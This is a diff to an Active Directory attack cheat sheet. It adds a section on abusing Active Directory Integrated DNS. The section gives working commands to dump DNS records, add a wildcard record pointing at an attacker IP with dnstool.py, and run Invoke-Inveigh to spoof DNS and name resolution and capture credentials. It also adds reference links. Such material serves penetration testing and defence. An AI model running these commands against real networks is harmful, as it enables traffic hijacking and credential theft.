@@ -95,6 +95,7 @@
     - [Pass-The-Certificate](#pass-the-certificate)
   - [Active Directory Federation Services](#active-directory-federation-services)
     - [ADFS - Golden SAML](#adfs---golden-saml)
+  - [Active Directory Integrated DNS](#active-directory-integrated-dns)
   - [UnPAC The Hash](#unpac-the-hash)
   - [Shadow Credentials](#shadow-credentials)
   - [Active Directory Groups](#active-directory-groups)
@@ -2853,6 +2854,30 @@ Other interesting tools to exploit AD FS:
 * [WhiskeySAML](https://github.com/secureworks/whiskeysamlandfriends/tree/main/whiskeysaml)
 
 
+## Active Directory Integrated DNS
+
+ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic. Active Directory will need some time (~180 seconds) to sync LDAP changes via its DNS dynamic updates protocol.
+
+* Enumerate all records using [dirkjanm/adidnsdump](https://github.com/dirkjanm/adidnsdump)
+    ```ps1
+    adidnsdump -u DOMAIN\\user --print-zones dc.domain.corp (--dns-tcp)
+    ```
+* Query a node using [dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)
+    ```ps1
+    dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController (--legacy)
+    ```
+* Add a node and attach a record
+    ```ps1
+    dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
+    ```
+
+The common way to abuse ADIDNS is to set a wildcard record and then passively listen to the network.
+
+```ps1
+Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
+```
+
+
 ## UnPAC The Hash
 
 Using the **UnPAC The Hash** method, you can retrieve the NT Hash for an User via its certificate.
@@ -4340,3 +4365,6 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
 * [Timeroasting: Attacking Trust Accounts in Active Directory - Tom Tervoort - 01 March 2023](https://www.secura.com/blog/timeroasting-attacking-trust-accounts-in-active-directory)
 * [TIMEROASTING, TRUSTROASTING AND COMPUTER SPRAYING WHITE PAPER - Tom Tervoort](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
+* [Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS - July 10, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)
+* [ADIDNS Revisited – WPAD, GQBL, and More - December 5, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/)
+* [Getting in the Zone: dumping Active Directory DNS using adidnsdump - Dirk-jan Mollema](https://blog.fox-it.com/2019/04/25/getting-in-the-zone-dumping-active-directory-dns-using-adidnsdump/)
